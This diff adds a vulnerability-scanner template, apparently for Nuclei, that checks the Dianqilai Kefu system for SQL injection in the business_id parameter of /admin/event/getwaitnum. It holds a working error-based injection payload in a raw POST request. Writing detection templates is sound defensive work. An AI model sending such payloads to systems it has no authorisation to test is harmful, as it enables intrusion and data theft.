@@ -1,0 +1,29 @@
+id: dianqilai-getwaitnum-sqli
+info:
+  name: Dianqilai Kefu System Getwaitnum SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The business_id parameter of the Dianqilai Kefu system interface /admin/event/getwaitnum has a SQL injection vulnerability due to improper filtering, allowing attackers to extract sensitive information or compromise the system further.
+  tags: sql-injection
+  reference:
+    - https://mp.weixin.qq.com/s/DXG228VhQVSCVVn2aeePOQ
+
+http:
+  - raw:
+      - |
+        POST /admin/event/getwaitnum HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+
+        business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5(0x5c)),1)&groupid=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "28d397e87306"
